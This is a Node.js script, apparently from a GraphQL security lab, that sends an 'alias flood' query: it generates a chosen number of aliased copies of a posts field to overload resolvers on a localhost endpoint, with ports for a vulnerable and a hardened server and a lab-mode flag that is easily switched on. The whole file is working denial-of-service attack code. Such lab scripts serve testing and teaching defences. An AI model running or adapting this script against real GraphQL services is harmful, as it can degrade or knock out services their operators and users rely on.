#!/usr/bin/env node
// Alias Flood Attack: creates many aliased selections of the same field to amplify resolver workload.
const fetch = require('node-fetch');
const yargs = require('yargs/yargs');
const { hideBin } = require('yargs/helpers');

const argv = yargs(hideBin(process.argv))
  .option('lab', { type: 'boolean', default: false, description: 'Enable lab mode' })
  .option('aliases', { type: 'number', default: 50, description: 'Number of aliases to generate' })
  .option('port', { type: 'number', default: 4000, description: 'Target port (4000=vulnerable, 4001=hardened)' })
  .argv;

if (!argv.lab && process.env.NODE_ENV !== 'lab') {
  console.log('Run with --lab or set NODE_ENV=lab to avoid misuse.');
  process.exit(1);
}

const endpoint = `http://localhost:${argv.port}/graphql`;
const aliasCount = argv.aliases;

let aliasFields = '';
for (let i = 0; i < aliasCount; i++) {
  aliasFields += `a${i}: posts { id }\n`;
}

const query = `query AliasFlood {\n${aliasFields}}`;

(async () => {
  console.log(`Sending alias flood with ${aliasCount} aliases to ${endpoint}`);
  const start = Date.now();
  try {
    const res = await fetch(endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ query }) });
    const json = await res.json();
    const duration = Date.now() - start;
    console.log('Duration ms:', duration);
    if (json.errors) {
      console.log('Errors (truncated):', JSON.stringify(json.errors).slice(0, 300));
    } else {
      console.log('Data keys:', Object.keys(json.data || {}));
    }
  } catch (e) {
    console.error('Request failed:', e.message);
  }
})();
